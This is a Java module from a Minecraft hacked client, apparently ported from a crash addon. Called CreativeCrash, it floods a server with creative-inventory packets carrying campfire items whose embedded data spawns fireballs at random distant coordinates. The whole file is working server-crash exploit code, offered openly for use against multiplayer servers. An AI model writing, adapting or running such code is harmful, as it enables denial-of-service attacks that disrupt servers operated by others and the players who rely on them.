// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class CreativeCrash extends Module {
    private final Setting<Integer> amount = new Setting<>("Amount", 15, 1, 100);

    public CreativeCrash() {
        super("CreativeCrash", Category.CRASH);
    }

    @Override
    public void onUpdate() {
        if (mc.player == null) return;
        if (!mc.player.getAbilities().creativeMode) {
            sendMessage("Requires creative mode");
            disable();
            return;
        }

        Random r = new Random();
        Vec3d pos = new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
        NbtCompound tag = new NbtCompound();
        NbtList list = new NbtList();
        list.add(NbtDouble.of(pos.x));
        list.add(NbtDouble.of(pos.y));
        list.add(NbtDouble.of(pos.z));
        tag.putString("id", "minecraft:small_fireball");
        tag.put("Pos", list);

        ItemStack stack = new ItemStack(Items.CAMPFIRE);
        stack.set(DataComponentTypes.BLOCK_ENTITY_DATA, NbtComponent.of(tag));
        for (int i = 0; i < amount.getValue(); i++) {
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, stack));
        }
    }
}
